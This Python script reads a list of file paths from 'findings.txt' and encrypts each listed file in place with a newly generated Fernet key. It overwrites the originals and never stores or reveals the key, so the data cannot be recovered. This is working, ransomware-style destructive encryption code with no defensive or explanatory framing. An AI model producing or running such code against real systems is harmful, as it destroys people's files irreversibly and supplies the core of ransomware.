import os
import cryptography
from cryptography.fernet import Fernet

# File path
file_path = "findings.txt"

# Check if file exists
if not os.path.exists(file_path):
    print("File not found.")
    exit()

# Read file content
with open(file_path, "r") as file:
    content = file.readlines()

# Generate encryption key
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt all files found in the path specified in the findings file
for line in content:
    if "File:" in line:
        file_to_encrypt = line.split(":")[1].strip()
        # Check if file exists
        if not os.path.exists(file_to_encrypt):
            print(f"File not found: {file_to_encrypt}")
            continue

        # Read file content
        with open(file_to_encrypt, "rb") as file:
            file_content = file.read()

        # Encrypt file content
        encrypted_content = cipher.encrypt(file_content)

        # Write encrypted content to file
        with open(file_to_encrypt, "wb") as file:
            file.write(encrypted_content)

        print(f"File encrypted: {file_to_encrypt}")

print("Encryption process completed.")
